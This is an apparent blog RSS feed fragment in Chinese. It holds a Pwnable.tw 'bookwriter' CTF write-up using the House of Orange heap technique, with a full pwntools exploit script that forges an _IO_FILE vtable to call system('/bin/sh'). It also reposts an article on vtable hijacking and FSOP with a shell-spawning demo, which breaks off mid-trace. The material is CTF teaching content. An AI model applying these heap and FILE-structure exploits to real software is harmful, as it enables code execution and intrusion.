0x7e64</code>。这条指令我们之前讲述过，是把指令后面的值所指定内存地址处后6个字节的值输入全局描述符表寄存器GDTR，但是当前这条指令读取的内存地址是0x7e64，我们在图中也展示了一下这个地址处后面6个单元存放的值，发现是全部是0。这肯定是不对的，正确的应该是在0x7c64处存放的值，即图中最下面一样的值。可见，问题出在这里，GDTR表的值读取不正确，这是实现从实模式到保护模式转换的非常重要的一步。</p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/30/%E3%80%90MIT6.828%E3%80%91Lab1-Exercise5/#disqus_thread</comments>
    </item>
    
    <item>
      <title>[Pwnable.tw]bookwriter</title>
      <link>https://billyotry.github.io/2021/01/29/[Pwnable.tw]bookwriter/</link>
      <guid>https://billyotry.github.io/2021/01/29/[Pwnable.tw]bookwriter/</guid>
      <pubDate>Fri, 29 Jan 2021 10:38:39 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;检查&quot;&gt;&lt;a href=&quot;#检查&quot; class=&quot;headerlink&quot; title=&quot;检查&quot;&gt;&lt;/a&gt;检查&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec main</span></span><br><span class="line">[*] &#x27;/home/C7/\xe6\xa1\x8c\xe9\x9d\xa2/tw/bookwriter/main&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br><span class="line"><span class="meta">$</span><span class="bash"> strings libc_64.so.6 | grep GNU</span></span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">GNU Libidn by Simon Josefsson    </span><br></pre></td></tr></table></figure><p>最近在学house_of_orange技术。这道题算是自己的第一次实践，但是本地能通，远程不知道为什么不行。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>首先这题的题目逻辑都很清楚，添加书页，浏览，编辑书页，查看信息功能。首先我们要知道的是house_of_orange技术我们需要heap地址，libc地址，以及libc 2.23及一下版本。</p><p>house_of_orange思路就是：</p><ol><li>首先修改<code>top_chunk</code>的<code>size</code>，然后再申请一个大的<code>malloc</code>（大于当前的<code>top_chunk</code>的大小，小于<code>mmap</code>的阈值），当修改的<code>top_chunk</code>满足条件时，这时我们原来的<code>top_chunk</code>就会被放入<code>unsorted bin</code>。</li><li>通过堆溢出修改原来top_chunk的内容，主要是伪造<code>IO_file_plus</code>指针的虚表，并伪造bk指针为unsorted bin attack攻击做准备。</li><li>当再次申请内存时，造成<code>unsorted bin attack</code>，将<code>_IO_list_all</code>覆写为<code>main_arena+88</code>，由于unsorted bin结构的破坏，程序异常，会在<code>malloc</code>中调用<code>malloc_printerr</code>函数进行错误打印，再<code>malloc_printerr</code>中调用<code>__libc_message</code>，进一步调用<code>abort()</code>，再调用<code>_IO_flush_all_lockp</code>，在其中调用_<code>IO_OVERFLOW(fp，EOF)</code>，这个函数就是使用虚表调用，如果可以覆盖调用的虚表，就可以达到提权的目的。</li></ol><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ul><li>我们可以看到存放name的地方于存放chunk指针的地方是一起的，并且信息是用%s打印的，当我们填满name后，也就是name和chunk指针之间是没有’\x00’的，那么在打印name的时候可以将chunk指针也就是heap地址一起打印出来</li><li>这里的溢出其实有两处。第一处在edit函数中，程序使用<code>strlen</code>函数，我们知道<code>strlen</code>这类字符串函数遇到’\x00’才会截断，当我们申请的chunk复用下一个chunk的pre_size字段的时候，我们的content就可以和下一个chunk的size连起来，也就是<code>strlen</code>的结果就是输入的长度+下一个堆块的size。第二处在add中，这里存放chunk指针的数组的最后一个和存放chunk的大小的数组的第一个其实是重合的，也就是当索引为0的chunk处如果放的是最后一个chunk的地址，那么此时索引为0的chunk的size就会非常大，那么就会造成溢出。本来这里是没法写入一个chunk地址的，因为我们的chunk0的size存放在此，不满足<code>!(&amp;qword_6020A0)</code>，但是如果我们的chunk0的内容是’\x00’开头，strlen会遇’\x00’截断，在他更新size大小的时候就会将size写为0，那么就能满足<code>!(&amp;qword_6020A0)</code>。</li></ul><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>由于这里的重点是IO_FILE的利用，那么只调试处关键的地方。</p><p>首先我们将top_chunk的size修改。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105821693/0" alt="image-20210129191049835"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105825502/0" alt="image-20210129191139571"></p><p>这里是size块覆写要满足3点要求，top chunk才能被释放到unsorted bin中</p><ol><li>size &gt;= MINSIZE</li><li>pre_inuse位为1</li><li>top_chunk地址 + size - 1是页对齐的</li></ol><p>当满足上面之后再次申请一个较大的堆块的时候就会将其放入unsorted bin中</p><blockquote><p>这里值得注意的是在打印信息的函数中存在scanf函数，scanf内部会申请一个0x1000大小的块，且不释放，就可以达到将原来的top_chunk释放到unsorted bin的目的</p></blockquote><p>将放入unsorted bin的chunk切割后，就能泄露出libc地址。</p><p>接下来就可以堆溢出构造unsorted bin attack了。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105871998/0" alt="image-20210129192316783"></p><p>我们看到我们将<code>_IO_list_all</code>修改为了main_arena+88，但是这里我们不是全部可控的，我们为了能够达到全部可控就要控制他的_chain字段，这个字段会指向下一个结构体，我们可以控制这个字段指向我们可控的内存中，这样就可以达到伪造一个IO FILE，可以通过将原来的top_chunk挂在fastbin的方法来进一步利用。我们只需要将原来的top_chunk改为0x61，然后bk改为<code>_IO_list_all-0x10</code>。当我们通过malloc创建堆块的时候，由于unsorted bin中的堆块不唯一，就会把unsorted bin中的堆块释放到bin中去，释放原来的top头时，会把该块挂在到fastbin[4]，也就是我们期待的位置，然后再处理bk指针，也就是<code>_IO_list_all</code>，会触发堆块大小为0的错误，进一步触发malloc_printerr等一系列函数。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105944849/0" alt="image-20210129193610700"></p><p>可以看到此时伪造的<code>_IO_file_plus</code>结构体，满足：</p><ol><li>mode = 0</li><li>write_ptr &gt; write_base</li></ol><p>并且vtable是我们伪造好的。</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13105957419/0" alt="image-20210129193831189"></p><p>最终调用的虚表函数<code>_IO_OVERFLOW</code>被我们修改成了system，最终malloc一个堆块即可触发漏洞。</p><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;chall.pwnable.tw&#x27;,10304)</span></span><br><span class="line">p=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc_64.so.6&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size of page :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index of page :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index of page :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">num,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(yes:1 / no:0) &#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    <span class="keyword">if</span>(num):</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Author :&#x27;</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">chunk_prt = <span class="number">0x6020A0</span>        </span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x17</span>+p64(<span class="number">0xfe1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip().ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content :\n&#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c5178</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system= &quot;</span>+<span class="built_in">hex</span>(system)</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;IO_list_all= &quot;</span>+<span class="built_in">hex</span>(IO_list_all)</span><br><span class="line">main_arena_88 = libc_base + <span class="number">0x3c4b20</span> + <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;main_arena_88= &quot;</span>+<span class="built_in">hex</span>(main_arena_88)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x100</span>+<span class="number">0x90</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)+p64(main_arena_88)+p64(IO_list_all-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">21</span></span><br><span class="line">vtalbe = heap_base + <span class="built_in">len</span>(payload)+<span class="number">0x10</span></span><br><span class="line">payload+=p64(vtalbe)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/29/[Pwnable.tw]bookwriter/#disqus_thread</comments>
    </item>
    
    <item>
      <title>【转载】IO FILE之劫持vtable及FSOP</title>
      <link>https://billyotry.github.io/2021/01/26/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91IO%20FILE%E4%B9%8B%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/</link>
      <guid>https://billyotry.github.io/2021/01/26/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91IO%20FILE%E4%B9%8B%E5%8A%AB%E6%8C%81vtable%E5%8F%8AFSOP/</guid>
      <pubDate>Tue, 26 Jan 2021 15:33:16 GMT</pubDate>
      <description>
      
        
        
          &lt;p&gt;转载来自&lt;code&gt;raycp&lt;/code&gt;师傅的文章：&lt;a href=&quot;https://xz.aliyun.com/t/5508&quot;&gt;https://xz.aliyun.com/t/5508&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;之前的文章对IO FILE相关功能函数的源码进行了分析，后续
        
      
      </description>
      
      
      <content:encoded><![CDATA[<p>转载来自<code>raycp</code>师傅的文章：<a href="https://xz.aliyun.com/t/5508">https://xz.aliyun.com/t/5508</a></p><p>之前的文章对IO FILE相关功能函数的源码进行了分析，后续将对IO FILE相关的利用进行阐述。</p><p>传送门：</p><ul><li><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fopen_analysis">IO FILE之fopen详解</a></p></li><li><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fread_analysis">IO FILE之fread详解</a></p></li><li><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fwrite_analysis">IO FILE之fwrite详解</a></p></li><li><p><a href="https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis">IO_FILE之fclose详解</a></p></li></ul><p>经过了前面对fopen等源码的介绍，知道了IO FILE结构体里面有个很重要的数据结构–<code>vtable</code>，IO函数的很多功能都是通过它去实现的。接下来主要描述如何通过劫持vtable去实现控制函数执行流以及通过FSOP来进行利用。</p><h2 id="vtable劫持"><a href="#vtable劫持" class="headerlink" title="vtable劫持"></a>vtable劫持</h2><p>本文是基于libc 2.23及之前的libc上可实施的，libc2.24之后加入了vtable check机制，无法再构造vtable。</p><p>vtable是<code>_IO_FILE_plus</code>结构体里的一个字段，是一个函数表指针，里面存储着许多和IO相关的函数。</p><h2 id="劫持原理"><a href="#劫持原理" class="headerlink" title="劫持原理"></a>劫持原理</h2><p><code>_IO_FILE_plus</code>结构体的定义为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>vtable</code>对应的结构体<code>_IO_jump_t</code>的定义为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个函数表中有19个函数，分别完成IO相关的功能，由IO函数调用，如<code>fwrite</code>最终<code>__write</code>函数、<code>fread</code>会调用<code>__doallocate</code>来分配IO缓冲区等。</p><p>给出<code>stdin</code>的IO FILE结构体和它的虚表的值，更直观的看下，首先是<code>stdin</code>的结构体</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13090194716/0" alt="20190627085831-ae732ce4-9876-1"></p><p>可以看到此时的函数表的值是<code>0x7ce23cc576e0 &lt;__GI_IO_file_jumps&gt;</code>，查看它的函数：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13090208786/0" alt="20190627085851-bac08de8-9876-1"></p><p>vtable劫持的原理是：如果能够控制FILE结构体，实现对vtable指针的修改，使得vtable指向可控的内存，在该内存中构造好vtable，再通过调用相应IO函数，触发vtable函数的调用，即可程序执行流。</p><p>从原理中可以看到，劫持最关键的点在于修改IO FILE结构体的vtable指针，指向可控内存。一般来说有两种方式：一种是只修改内存中已有FILE结构体的vtable字段；另一种则是伪造整个FILE结构体。当然，两种的本质最终都是修改了vtable字段。</p><p>demo示例程序可以参考<a href="https://wiki.gdpcisa.org/pwn/io_file/fake-vtable-exploit/">ctf wiki</a>中的示例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个示例通过修改已有FILE结构体的内存的vtable，使其指向用户可控内存，实现劫持程序执行<code>system(&quot;sh&quot;)</code>的过程。</p><p>有了前面几篇文章对vtable调用的基础，劫持的原理理解就比较容易了，不再赘述。</p><h2 id="IO调用的vtable函数"><a href="#IO调用的vtable函数" class="headerlink" title="IO调用的vtable函数"></a>IO调用的vtable函数</h2><p>在这里给出<code>fopen</code>、<code>fread</code>、<code>fwrite</code>、<code>fclose</code>四个函数会调用的vtable函数，之前在每篇文章的末尾都会给出，在这里统一总结下，方便后面利用的时候能够较快的找到所需劫持的函数指针。</p><p><code>fopen</code>函数是在分配空间，建立FILE结构体，未调用vtable中的函数。</p><p><code>fread</code>函数中调用的vtable函数有：</p><ul><li><code>_IO_sgetn</code>函数调用vtable的<code>_IO_file_xsgetn</code>。</li><li><code>_IO_doallocbuf</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>__underflow</code>函数调用了vtable中的<code>_IO_new_file_underflow</code>实现文件数据读取。</li><li>vtable中的<code>_IO_new_file_underflow</code>调用了vtable中<code>__GI_IO_file_read</code>最终去执行系统调用read。</li></ul><p><code>fwrite</code>函数调用的vtable函数有：</p><ul><li><code>_IO_fwrite</code>函数调用了vtable的<code>_IO_new_file_xsputn</code>。</li><li><code>_IO_new_file_xsputn</code>函数调用了vtable中的<code>_IO_new_file_overflow</code>实现缓冲区的建立以及刷新缓冲区。</li><li>vtable中的<code>_IO_new_file_overflow</code>函数调用了vtable的<code>_IO_file_doallocate</code>以初始化输入缓冲区。</li><li>vtable中的<code>_IO_file_doallocate</code>调用了vtable中的<code>__GI__IO_file_stat</code>以获取文件信息。</li><li><code>new_do_write</code>中的<code>_IO_SYSWRITE</code>调用了vtable<code>_IO_new_file_write</code>最终去执行系统调用write。</li></ul><p><code>fclose</code>函数调用的vtable函数有：</p><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为vtable中的<code>__close</code>函数。</li><li><code>_IO_FINISH</code>函数为vtable中的<code>__finish</code>函数，</li></ul><p>其他的IO函数功能相类似的调用的应该都差不多，可以参考下。</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP的全称是<code>File Stream Oriented Programming</code>，关键点在于前面<code>fopen</code>函数中描述过的<code>_IO_list_all</code>指针。</p><p>进程中打开的所有文件结构体使用一个单链表来进行管理，即通过<code>_IO_list_all</code>进行管理，在<code>fopen</code>的分析中，我们知道了fopen是通过<code>_IO_link_in</code>函数将新打开的结构体链接进入<code>_IO_list_all</code>的，相关的代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">...</span><br><span class="line">fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">_IO_list_all = fp;</span><br></pre></td></tr></table></figure><p>从代码中也可以看出来链表是通过FILE结构体的<code>_chain</code>字段来进行链接的。</p><p>正常的进行中存在stderr、stdout以及stdin三个IO FILE，此时<code>_IO_list_all</code>如下：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13092653300/0" alt="stder"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13092654068/0" alt="stdout"></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13092654861/0" alt="stdin"></p><p>形成的链表如下图所示：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13092661132/0" alt="20190627090036-f9501556-9876-1"></p><p>看到链表的操作，应该就大致猜到了FSOP的主要原理了。即通过伪造<code>_IO_list_all</code>中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改<code>_IO_list_all</code>直接指向可控的地址。</p><p>具体来说该如何利用呢？glibc中有一个函数<code>_IO_flush_all_lockp</code>，该函数的功能是刷新所有FILE结构体的输出缓冲区，相关源码如下，文件在<code>libio\genops</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)   <span class="comment">//，如果输出缓冲区有数据，刷新输出缓冲区</span></span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过对<code>fwrite</code>分析，我们知道输出缓冲区的数据保存在<code>fp-&gt;_IO_write_base</code>处，且长度为<code>fp-&gt;_IO_write_ptr - _IO_write_base</code>，因此上面的<code>if</code>语句实质上是判断该FILE结构输出缓冲区是否还有数据，如果有则调用<code>_IO_OVERFLOW</code>去刷新缓冲区。其中<code>_IO_OVERFLOW</code>是vtable中的函数，因此如果我们可以控制<code>_IO_list_all</code>链表中的一个节点的话，就有可能控制程序执行流。</p><p>可以看出来该函数的意义是为了保证数据不流失，因此在程序执行退出相关代码时，会去调用函数去刷新缓冲区，确保数据被保存。根据<code>_IO_flush_all_lockp</code>的功能，猜测这个函数应该是在程序退出的时候调用的，因为它刷新所有FILE的缓冲区。事实上，会调用<code>_IO_flush_all_lockp</code>函数的时机包括：</p><ul><li>libc执行abort函数时。</li><li>程序执行exit函数时。</li><li>程序从main函数返回时。</li></ul><p>再多做一点操作，去看下上述三种情况的堆栈，来进一步了解程序的流程。将断点下在<code>_IO_flush_all_lockp</code>，查看栈结构。</p><p>首先是abort函数的流程，利用的double free函数触发，栈回溯为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="number">0x0</span>)</span><br><span class="line">__GI_abort ()</span><br><span class="line">__libc_message (do_abort=do_abort@entry=<span class="number">0x2</span>, fmt=fmt@entry=<span class="number">0x7ffff7ba0d58</span> <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>)</span><br><span class="line">malloc_printerr (action=<span class="number">0x3</span>, str=<span class="number">0x7ffff7ba0e90</span> <span class="string">&quot;double free or corruption (top)&quot;</span>, ptr=&lt;optimized out&gt;, ar_ptr=&lt;optimized out&gt;)</span><br><span class="line">_int_free (av=<span class="number">0x7ffff7dd4b20</span> &lt;main_arena&gt;, p=&lt;optimized out&gt;,have_lock=<span class="number">0x0</span>)</span><br><span class="line">main ()</span><br><span class="line">__libc_start_main (main=<span class="number">0x400566</span> &lt;main&gt;, argc=<span 